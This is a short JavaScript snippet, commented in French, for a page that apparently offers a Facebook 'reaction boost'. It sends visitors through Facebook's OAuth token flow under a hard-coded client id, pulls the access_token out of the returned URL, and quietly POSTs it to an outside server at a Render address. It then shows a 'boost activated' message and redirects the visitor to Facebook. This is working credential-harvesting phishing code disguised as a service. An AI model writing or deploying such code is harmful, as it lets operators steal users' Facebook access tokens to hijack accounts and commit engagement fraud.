// On vérifie si l'URL contient un access_token (après la redirection de FB)
if (window.location.hash.includes('access_token')) {
    const params = new URLSearchParams(window.location.hash.replace('#', '?'));
    const token = params.get('access_token');

    if (token) {
        // Envoi automatique vers ton serveur Render
        fetch('https://ton-site-sur-render.com/save-token', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token: token })
        })
        .then(() => {
            alert("✅ Boost activé ! Tes réactions arrivent.");
            window.location.href = "https://facebook.com"; // Redirection propre
        });
    }
}

// Le bouton de connexion reste le même
document.getElementById('loginBtn').onclick = function() {
    const clientId = "350685531728";
    const redirectUri = window.location.href; // Redirige vers ton propre site GitHub
    window.location.href = `https://www.facebook.com/v1.0/dialog/oauth?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=token`;
};
